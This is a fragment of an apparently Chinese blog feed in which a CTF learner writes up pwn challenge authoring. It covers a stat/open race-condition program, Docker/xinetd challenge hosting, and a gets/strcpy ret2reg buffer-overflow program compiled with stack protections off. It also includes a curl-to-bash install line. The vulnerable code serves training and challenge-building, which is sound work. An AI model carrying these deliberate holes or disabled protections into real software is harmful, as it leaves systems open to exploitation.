            "content_html": "<p>​\t\t这个题目搭建环境不知道怎么搭建…控制不好权限直接就可以执行命令拿flag了..</p>\n<p>改一下函数, system和&#x2F;bin&#x2F;sh 或者给出libc地址?  gift</p>\n<p>gcc -o race main.c -fno-stack-protector  -no-pie需要关闭canary和pie</p>\n<p><a href=\"https://bbs.huaweicloud.com/blogs/399812\">https://bbs.huaweicloud.com/blogs/399812</a></p>\n<p>为啥出错呢， core dumped看一下吧</p>\n<p><a href=\"https://blog.csdn.net/qq_43714097/article/details/130734858\">https://blog.csdn.net/qq_43714097/article/details/130734858</a></p>\n<p><a href=\"https://stackoverflow.com/questions/32892908/c-system-raises-enomem\">https://stackoverflow.com/questions/32892908/c-system-raises-enomem</a></p>\n<p><a href=\"https://airman604.medium.com/protostar-stack7-walkthrough-2aa2428be3e0\">https://airman604.medium.com/protostar-stack7-walkthrough-2aa2428be3e0</a></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-40-racecondition%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/image-20231116172304057.png\" alt=\"image-20231116172304057\"></p>\n<p><a href=\"https://blog.csdn.net/weixin_44411509/article/details/109860791\">https://blog.csdn.net/weixin_44411509/article/details/109860791</a></p>\n<p><a href=\"https://blog.csdn.net/chichoxian/article/details/53486131\">https://blog.csdn.net/chichoxian/article/details/53486131</a></p>\n<p>主要就是这里说的问题</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\">//void showflag() &#123; system(&quot;cat flag&quot;); &#125;</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *argv[]=&#123;<span class=\"string\">&quot;cat&quot;</span>,<span class=\"string\">&quot;./flag&quot;</span>, <span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\"> <span class=\"type\">char</span> *envp[]=&#123;<span class=\"number\">0</span>,<span class=\"literal\">NULL</span>&#125;;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">showflag</span><span class=\"params\">()</span> &#123; execve(<span class=\"string\">&quot;/bin/cat&quot;</span>,argv,envp); &#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">vuln</span><span class=\"params\">(<span class=\"type\">char</span> *file, <span class=\"type\">char</span> *buf)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> number;</span><br><span class=\"line\">  <span class=\"type\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"type\">int</span> fd = open(file, O_RDONLY);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (fd == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;open file failed!!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    number = read(fd, buf + index, <span class=\"number\">128</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (number &lt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    index += number;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  buf[index + <span class=\"number\">1</span>] = <span class=\"string\">&#x27;\\x00&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">check</span><span class=\"params\">(<span class=\"type\">char</span> *file)</span> &#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">tmp</span>;</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">strcmp</span>(file, <span class=\"string\">&quot;flag&quot;</span>) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;file can not be flag!!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  stat(file, &amp;tmp);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (tmp.st_size &gt; <span class=\"number\">255</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;file size is too large!!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[argc])</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">256</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (argc == <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">    check(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    vuln(argv[<span class=\"number\">1</span>], buf);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Usage ./prog &lt;filename&gt;&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>回头整理一下搭建题目环境。。。</p>\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-39-docker%E5%85%A5%E9%97%A8%E5%8F%8Apwn%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-39-docker%E5%85%A5%E9%97%A8%E5%8F%8Apwn%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/",
            "title": "pwn入门-39-docker入门及pwn出题环境搭建",
            "date_published": "2023-09-16T05:30:16.000Z",
            "content_html": "<h1 id=\"docker\"><a href=\"#docker\" class=\"headerlink\" title=\"docker\"></a>docker</h1><p>入门参考资料:<a href=\"https://www.runoob.com/docker\">https://www.runoob.com/docker</a></p>\n<p><a href=\"https://yeasy.gitbook.io/docker_practice/\">https://yeasy.gitbook.io/docker_practice/</a></p>\n<h2 id=\"一、安装\"><a href=\"#一、安装\" class=\"headerlink\" title=\"一、安装\"></a>一、安装</h2><p>使用官方脚本安装docker</p>\n<p>curl -fsSL <a href=\"https://get.docker.com/\">https://get.docker.com</a> | bash -s docker –mirror Aliyun</p>\n<p>手动安装(不如脚本稳定少出错)</p>\n<p>开启docker </p>\n<p>systemctl enable docker </p>\n<p>systemctl start docker</p>\n<p>测试是否安装成功: docker run –rm hello-world</p>\n<p>hello-world是测试容器, –rm表示退出容器后,自动删除容器</p>\n<h2 id=\"二、使用入门\"><a href=\"#二、使用入门\" class=\"headerlink\" title=\"二、使用入门\"></a>二、使用入门</h2><h3 id=\"1-镜像\"><a href=\"#1-镜像\" class=\"headerlink\" title=\"1.镜像\"></a>1.镜像</h3><ul>\n<li><p>docker images 查看本地镜像</p>\n</li>\n<li><p>docker pull xxxx 拉去镜像, 例如docker pull ubuntu:18.04</p>\n</li>\n</ul>\n<p>​\t\t不给镜像仓库地址的话, 会从 Docker Hub （<code>docker.io</code>）获取镜像, 而镜像名称是 <code>ubuntu:18.04</code>，因此将会获取官方镜像 <code>library/ubuntu</code> 仓库中标签为 <code>18.04</code> 的镜像。<code>docker pull</code>命令的输出结果最后一行给出了镜像的完整名称，例如： <code>docker.io/library/ubuntu:18.04</code>。</p>\n<ul>\n<li><p>docker rmi xxxx  删除镜像</p>\n</li>\n<li><p>docker build -t xxxx .  用dockerfile构建镜像</p>\n</li>\n</ul>\n<h3 id=\"2-容器\"><a href=\"#2-容器\" class=\"headerlink\" title=\"2.容器\"></a>2.容器</h3><ul>\n<li><p>docker ps 查看容器 -a查看所有(包括停止的)</p>\n</li>\n<li><p>docker run -it ubuntu:18.04 bash</p>\n</li>\n</ul>\n<p>​\t-it: -i 交互式操作 -t 终端 </p>\n<p>​\tbash 命令,希望有交互式shell,所以用这个,或者&#x2F;bin&#x2F;sh之类的</p>\n<ul>\n<li>docker stop xxx  停止容器</li>\n</ul>\n<h1 id=\"CTF-pwn出题环境搭建\"><a href=\"#CTF-pwn出题环境搭建\" class=\"headerlink\" title=\"CTF-pwn出题环境搭建\"></a>CTF-pwn出题环境搭建</h1><p>​\t\tpwn出题主要用到了 <a href=\"https://github.com/Eadom/ctf_xinetd\">https://github.com/Eadom/ctf_xinetd</a></p>\n<p>环境搭建</p>\n<p><a href=\"https://blog.csdn.net/weixin_53757397/article/details/128489015\">https://blog.csdn.net/weixin_53757397/article/details/128489015</a></p>\n<p><a href=\"https://blog.csdn.net/mylyylmy/article/details/79917776\">https://blog.csdn.net/mylyylmy/article/details/79917776</a></p>\n<p><a href=\"https://nocbtm.github.io/2019/09/25/pwn%E9%A2%98%E7%9A%84%E6%90%AD%E5%BB%BA/\">https://nocbtm.github.io/2019/09/25/pwn题的搭建/</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_53757397/article/details/128489015\">https://blog.csdn.net/weixin_53757397/article/details/128489015</a> 感觉有点啰嗦,不一定需要上传docker仓库</p>\n<p><a href=\"https://blog.csdn.net/weixin_46521144/article/details/120572274\">https://blog.csdn.net/weixin_46521144/article/details/120572274</a> 排错</p>\n<h2 id=\"搭建步骤\"><a href=\"#搭建步骤\" class=\"headerlink\" title=\"搭建步骤\"></a>搭建步骤</h2><p>git clone <a href=\"https://github.com/Eadom/ctf_xinetd.git\">https://github.com/Eadom/ctf_xinetd.git</a></p>\n<ol>\n<li>将编译好的libc、flag、题目文件拷贝到bin目录下</li>\n</ol>\n<p>​\t\t如果需要特定的libc</p>\n<p>​\t\t提前patchelf好,把libc文件页拷贝到ctf_xinetd的bin目录下</p>\n<p>​\t\tpatchelf –set-interpreter .&#x2F;2.31-0ubuntu9_amd64&#x2F;ld-linux-x86-64.so.2 .&#x2F;timu<br>​\t\tpatchelf –set-rpath .&#x2F;2.31-0ubuntu9_amd64&#x2F; .&#x2F;timu</p>\n<p>​\t\t用绝对路径不知道为什么不行????</p>\n<ol start=\"2\">\n<li>创建docker-compose.yml文件,这里的3389改成题目要映射的端口(物理机的),9999是docker里面的端口,image名字要和后面创建的docker images名字一样</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &#x27;3&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">    pwn:</span><br><span class=\"line\">        build: ./</span><br><span class=\"line\">        image: pwn1 #这里修改的是images名,将和 docker build -t &quot;pwn1&quot; . 该命令有关</span><br><span class=\"line\">        ports:</span><br><span class=\"line\">            - &quot;3389:9999&quot;</span><br><span class=\"line\">        pids_limit: 1024</span><br><span class=\"line\">        # cpus: 0.5</span><br><span class=\"line\">        restart: unless-stopped</span><br><span class=\"line\">        # privileged: true</span><br></pre></td></tr></table></figure>\n\n<p>Dockerfile</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">FROM ubuntu:<span class=\"number\">22.04</span> 根据情况修改版本</span><br><span class=\"line\">  </span><br><span class=\"line\">RUN cp -R /lib* /home/ctf &amp;&amp;\\  版本高于<span class=\"number\">18.04</span>要删除这一句??为啥呢??</span><br><span class=\"line\">  \tcp -R /usr/lib* /home/ctf </span><br></pre></td></tr></table></figure>\n\n\n\n<p>ctf.xinetd</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service ctf</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    disable = no</span><br><span class=\"line\">    socket_type = stream</span><br><span class=\"line\">    protocol    = tcp</span><br><span class=\"line\">    wait        = no</span><br><span class=\"line\">    user        = root</span><br><span class=\"line\">    type        = UNLISTED</span><br><span class=\"line\">    port        = <span class=\"number\">9999</span></span><br><span class=\"line\">    bind        = <span class=\"number\">0.0</span><span class=\"number\">.0</span><span class=\"number\">.0</span></span><br><span class=\"line\">    server      = /usr/sbin/chroot</span><br><span class=\"line\">    <span class=\"meta\"># replace helloworld to your program</span></span><br><span class=\"line\">    server_args = --userspec=<span class=\"number\">1000</span>:<span class=\"number\">1000</span> /home/ctf ./timu   这里timu是题目bin文件名</span><br><span class=\"line\">    banner_fail = /etc/banner_fail</span><br><span class=\"line\">    <span class=\"meta\"># safety options</span></span><br><span class=\"line\">    per_source\t= <span class=\"number\">10</span> <span class=\"meta\"># the maximum instances of this service per source IP address</span></span><br><span class=\"line\">    rlimit_cpu\t= <span class=\"number\">20</span> <span class=\"meta\"># the maximum number of CPU seconds that the service may use</span></span><br><span class=\"line\">    #rlimit_as  = <span class=\"number\">1024</span>M <span class=\"meta\"># the Address Space resource limit for the service</span></span><br><span class=\"line\">    #access_times = <span class=\"number\">2</span>:<span class=\"number\">00</span><span class=\"number\">-9</span>:<span class=\"number\">00</span> <span class=\"number\">12</span>:<span class=\"number\">00</span><span class=\"number\">-24</span>:<span class=\"number\">00</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"3\">\n<li>制作镜像</li>\n</ol>\n<p>​\t\t建立容器,pwn1名字就是镜像的名字</p>\n<figure class=\"highlight erlang\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build -t <span class=\"string\">&quot;pwn1&quot;</span> .</span><br></pre></td></tr></table></figure>\n\n\n\n<p>4.创建运行容器</p>\n<p>​\t\tdocker run -d -p 0.0.0.0:3389:9999 pwn1 运行容器,这里就部署好了,可以进行打了,3389是暴露出来的端口</p>\n<p>​\t\tdocker exec -it 16a224caf905 &#x2F;bin&#x2F;bash  和容器进行交互,(这个是退出后再次进入,和run时候-it不一样)</p>\n<p>文件拷贝 <a href=\"https://blog.csdn.net/sunhuaqiang1/article/details/88354410\">https://blog.csdn.net/sunhuaqiang1/article/details/88354410</a></p>\n<p>docker cp &#x2F;root&#x2F;chuti&#x2F;uaf&#x2F;timu pwncp:&#x2F;home&#x2F;ctf&#x2F;timu</p>\n<p><a href=\"https://blog.csdn.net/yue7603835/article/details/122456650\">https://blog.csdn.net/yue7603835/article/details/122456650</a></p>\n",
            "tags": [
                "PWN入门",
                "docker"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/",
            "title": "pwn入门-38-月赛出题3道",
            "date_published": "2023-09-16T05:23:18.000Z",
            "content_html": "<p>​\t\t例行月赛出题，出了三道，两道是基于自己做过的题，融合了其他知识点（缝缝补补又一年），还有一道是临时出的凑数的。感觉确实不仅需要做题，也需要出题，出题的时候才能更好地理解出题人的想法（废话。。），以及注意到之前的很多细节。</p>\n<p>​\t\t这次也踩坑踩了很多，比如条件竞争的题目，不知道怎么部署。。。想了很多方案都不行。以及docker容器自身的问题，它只是隔离了进程，并没有用新的内核，所以一些内核特性用不了。</p>\n<h1 id=\"ret2reg\"><a href=\"#ret2reg\" class=\"headerlink\" title=\"ret2reg\"></a>ret2reg</h1><h2 id=\"题目源码\"><a href=\"#题目源码\" class=\"headerlink\" title=\"题目源码\"></a>题目源码</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span>    </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span>    </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">evilfunction</span><span class=\"params\">(<span class=\"type\">char</span> *input)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> buffer[<span class=\"number\">512</span>];    </span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buffer, input);    </span><br><span class=\"line\">&#125;    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> input[<span class=\"number\">580</span>];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;welcome to here,please give me something&quot;</span>);</span><br><span class=\"line\">    gets(input);</span><br><span class=\"line\">    evilfunction(input);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;    </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>​\t\t本身这道题的原题是没有开启随机化，相对比较简单，可以直接写shellcode，然后call eax这种过去执行shellcode，但是如果开了随机化，call eax的地址就不确定了，<font color=\"red\">但是可以进行枚举，（之前一直不会写枚举的脚本，这次学会了。。。）感觉之前有时候也是成功了,但是没有正确停止或打印</font></p>\n<p>​\t\tPIE和ALSR:</p>\n<p>ALSR:&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_spac  完全开启时 栈、堆、libc变化,程序本身及PLT不变</p>\n<p>PIE:可执行程序的加载基址</p>\n<p>​\t\t在作者那个年代,应该是默认不开启PIE的,现在都是默认开启… 不开启的话,就很容易了,alsr不影响,所以做的时候有点怪怪的…</p>\n<pre><code>gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector -no-pie\n</code></pre>\n<p>objdump -d ret2reg</p>\n<p>804901d</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/image-20230916141427362.png\" alt=\"image-20230916141427362\"></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/image-20230916141359497.png\" alt=\"image-20230916141359497\"></p>\n<h2 id=\"开启PIE\"><a href=\"#开启PIE\" class=\"headerlink\" title=\"开启PIE\"></a>开启PIE</h2><p>​\t\t进行枚举, 随机化程度是多少呢??</p>\n<h2 id=\"踩坑-改为用户输入\"><a href=\"#踩坑-改为用户输入\" class=\"headerlink\" title=\"踩坑,改为用户输入\"></a>踩坑,改为用户输入</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span>    </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span>    </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">evilfunction</span><span class=\"params\">(<span class=\"type\">char</span> *input)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> buffer[<span class=\"number\">512</span>];    </span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buffer, input);    </span><br><span class=\"line\">&#125;    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;    </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> input[<span class=\"number\">580</span>];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;welcome to here,please give me something&quot;</span>);</span><br><span class=\"line\">    gets(input);</span><br><span class=\"line\">    evilfunction(input);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;    </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"SROP\"><a href=\"#SROP\" class=\"headerlink\" title=\"SROP\"></a>SROP</h1><p>​\t\t本来寻思直接给个&#x2F;bin&#x2F;sh会简单,后来发现好像和原题差不多…然后不如加个系统调用限制(不过好像过滤的不完全,还是能getshell?)</p>\n<p>如何直接写汇编呢？ （也可以写一篇分析</p>\n<p><a href=\"https://blog.csdn.net/qq_27816307/article/details/50995042\">https://blog.csdn.net/qq_27816307/article/details/50995042</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">section .data            ; 数据段声明</span><br><span class=\"line\">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class=\"line\">        len equ $ - msg                 ; 字串长度</span><br><span class=\"line\"></span><br><span class=\"line\">section .text            ; 代码段声明</span><br><span class=\"line\">global _start            ; 指定入口函数</span><br><span class=\"line\">_start:                  ; 在屏幕上显示一个字符串</span><br><span class=\"line\">mov eax, 4       ; 系统调用号(sys_write)</span><br><span class=\"line\">;man 2 write 可以查看write系统调用的功能</span><br><span class=\"line\">;write函数原型： ssize_t write(int fd,const void *buf,size_t count);</span><br><span class=\"line\">mov ebx, 1       ; 参数一：文件描述符(stdout)</span><br><span class=\"line\">mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class=\"line\">mov edx, len     ; 参数三：字符串长度</span><br><span class=\"line\">int 0x80         ; 调用内核功能。软中断，陷入内核</span><br><span class=\"line\">mov eax, 1       ; 系统调用号(sys_exit)</span><br><span class=\"line\">mov ebx, 0       ; 参数一：退出代码</span><br><span class=\"line\">int 0x80         ; 调用内核功能</span><br></pre></td></tr></table></figure>\n\n\n\n<p>nasm 注意编译多少位的，blog里面是32的，64的话</p>\n<p>nams -f elf64 hello.asm</p>\n<p>用gcc链接也可以（本质都一样吧）</p>\n<p>gcc -o example example.o</p>\n<p>ld -s -o hello hello.o</p>\n<p>反汇编看一下</p>\n<p>用seccmp禁掉execve？ 还是啥</p>\n<p>先封装到c里面</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nasm -f elf64 hello.<span class=\"keyword\">asm</span></span><br><span class=\"line\">gcc -fno-<span class=\"built_in\">stack</span>-protector  -no-pie  -o myprogram <span class=\"number\">1.</span>c hello.o</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-38-%E6%9C%88%E8%B5%9B%E5%87%BA%E9%A2%983%E9%81%93/image-20230829111052913.png\" alt=\"image-20230829111052913\"></p>\n<p>objdump -s -j .rodata your_binary_file 查看字符串</p>\n<p><strong>seccomp</strong></p>\n<p>关于文件描述符的调试，gdb中如何查看呢？  Linux中又如何查看呢？</p>\n<p>1.c:4:10: fatal error: seccomp.h: 没有那个文件或目</p>\n<p>sudo apt-get install libseccomp-dev</p>\n<p>编译的时候需要加选项  -lseccomp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span 